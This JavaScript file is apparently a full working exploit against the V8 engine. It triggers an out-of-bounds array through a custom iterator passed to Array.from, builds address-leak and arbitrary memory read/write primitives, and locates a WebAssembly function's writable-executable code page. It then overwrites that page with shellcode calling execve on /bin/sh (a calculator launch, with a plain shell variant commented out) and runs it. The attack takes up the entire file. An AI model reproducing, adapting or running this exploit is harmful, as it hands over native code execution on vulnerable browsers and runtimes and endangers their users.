/*
var isdebug=1;
function dp(...obj){
 if(isdebug){
  for(let i=0;obj[i];i++){
   %DebugPrint(obj[i]);
  }
 } 
 %SystemBreak();
}
*/
class typeConvert{
 constructor(){
  this.buf = new ArrayBuffer(8);
  this.f64 = new Float64Array(this.buf);
  this.u32 = new Uint32Array(this.buf);
  this.bytes = new Uint8Array(this.buf);
    }
    //convert float to int
 f2i(val){  
  this.f64[0] = val;
  let tmp = Array.from(this.u32);
  return tmp[1] * 0x100000000 + tmp[0];
    }   
    /*
    convert int to float
    if nead convert a 64bits int to float
    please use string like "deadbeefdeadbeef"
    (v8's SMI just use 56bits, lowest 8bits is zero as flag)
    */
    i2f(val){
        let vall = hex(val);
  let tmp = [];
        tmp[0] = vall.slice(10, );
        tmp[1] = vall.slice(2, 10);
        tmp[0] = parseInt(tmp[0], 16);
  tmp[1] = parseInt(tmp[1], 16);
  this.u32.set(tmp);
  return this.f64[0];
    }
}
//convert number to hex string
function hex(x)
{
    return '0x' + (x.toString(16)).padStart(16, 0);
}
var dt = new typeConvert();
/*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/
var bufArray = [];
var objArray = [];
var oobArray = [1.1];
var maxSize = 8224;
function objGen(tag){
    this.leak = 0x1234;
    this.tag = tag;
}
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : x => (
    {
        counter : 0,
        next() {
        let result = 1.1;
        this.counter++;
        if (this.counter > maxSize) {
            oobArray.length = 1;
            bufArray.push(new ArrayBuffer(0xbeef));
            objArray.push(new objGen(0xdead));
            return {done: true};
        } else {
            return {value: result, done: false};
        }
        }
    }
) });
/*------search a ArrayBuffer which could be controlled by oobArray-------*/
var offsetBuf; //target offset of oobArray
var indexBuf;  //target offset in bufArray
//dp(oobArray,objArray,bufArray);
for(let x=0; x<=maxSize; x++) {let y = oobArray[x]}; //trigger the GC
//search obj&JSArray offset
for(let i = 0; i < maxSize; i++){
    let val = dt.f2i(oobArray[i]);
    if(0xbeef00000000===val){
        offsetBuf = i-3;
        console.log("buf offset: " + offsetBuf);
    }
    if(0xdead00000000===val){
        offsetObjLeak = i-1;
        console.log("objGen.leak offset: " + offsetObjLeak);
        break;
    }
}
//dp(oobArray,objArray,bufArray);
function addressOf(target){
    objArray[0].leak = target;
    return dt.f2i(oobArray[offsetObjLeak]);
}
/*---------------------arbitrary address read / write--------------------*/
// arbitrary address write
var dtView = new DataView(bufArray[0]);
function write64(addr, value){
    oobArray[offsetBuf+4] = dt.i2f(addr);
    dtView.setFloat64(0, dt.i2f(value), true);
}
// arbitrary address read
function read64(addr, str=false){
    oobArray[offsetBuf+4] = dt.i2f(addr);
    let tmp = ['', ''];
    let tmp2 = ['', ''];
    let result = ''
    tmp[1] = hex(dtView.getUint32(0)).slice(10,);
    tmp[0] = hex(dtView.getUint32(4)).slice(10,);
    for(let i=3; i>=0; i--){
        tmp2[0] += tmp[0].slice(i*2, i*2+2);
        tmp2[1] += tmp[1].slice(i*2, i*2+2);
    }
    result = tmp2[0]+tmp2[1]
    if(str==true){return '0x'+result}
    else {return parseInt(result, 16)};
}
/*-------------------------use wasm to execute shellcode------------------*/
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,
    127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,
    1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,
    0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,10,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var funcAsm = wasmInstance.exports.main;
//dp(funcAsm);
var addressFasm = addressOf(funcAsm);
console.log("addressFasm: "+addressFasm);
var sharedInfo = read64(addressFasm+0x18-0x1);
console.log("sharedInfo: "+sharedInfo);
var codeAddr = read64(sharedInfo+0x8-0x1);
console.log("codeAddr: "+codeAddr);
var memoryRWX = (read64(codeAddr+0x70-0x1)/0x10000);
memoryRWX = Math.floor(memoryRWX);
console.log("memoryRWX: "+hex(memoryRWX));
//dp(funcAsm);
//sys_execve('/bin/sh')
/*
var shellcode = [
    '2fbb485299583b6a',
    '5368732f6e69622f',
    '050f5e5457525f54'
];*/

var shellcode = [
    '622fbb4899583b6a',
    '48530068732f6e69',
    '480000632d68e789',
    '0000001ce852e689',
    '3d59414c50534944',
    '656d6f6e6720303a',
    '616c75636c61632d',
    '8948575600726f74',
    '0000000000050fe6'
];

//write shellcode into RWX memory
var offsetMem = 0;
for(x of shellcode){
    write64(memoryRWX+offsetMem, x);
    offsetMem+=8;
}
//call funcAsm() and it would execute shellcode actually
funcAsm();
